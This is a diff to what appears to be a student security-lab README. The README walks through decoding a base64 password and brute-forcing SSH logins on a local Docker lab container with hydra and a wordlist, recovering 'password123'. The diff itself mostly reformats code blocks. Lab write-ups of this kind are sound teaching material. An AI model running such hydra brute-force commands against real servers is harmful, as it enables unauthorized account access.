@@ -28,12 +28,18 @@ using `echo "bXlwYXNzd29yZDk4OTgh" | base64 --decode` I got `mypassword9898!` as
 
 > Process
 >> After starting the docker container/server -
-```sudo docker run -p 2222:22 -d -ti sylvainkalache/264-1```
+```
+sudo docker run -p 2222:22 -d -ti sylvainkalache/264-1
+```
 and cleaning the ./password_dictionary.txt file (retaining only passwords of char. length 11) -
-```sed -i '/^.\{11\}$/!d' password_dictionary.txt```
+```
+sed -i '/^.\{11\}$/!d' password_dictionary.txt
+```
 
 I used
-```hydra -l sylvain -P ./password_dictionary.txt -s 2222 ssh://127.0.0.1```
+```
+hydra -l sylvain -P ./password_dictionary.txt -s 2222 ssh://127.0.0.1
+```
 
 #### Result
 I got the hydra response
@@ -48,5 +54,5 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-07 13:55:
 with `password123` as the password
 
 ### Resources
-password_dictionary.txt source is the Kaggle bruteforce-database-password-dictionaries originally named
+password_dictionary.txt source is the Kaggle bruteforce-database-passwords originally named
 `1000000-password-seclists.txt` - [Download Repo](https://www.kaggle.com/datasets/taranvee/bruteforce-database-password-dictionaries?resource=download)
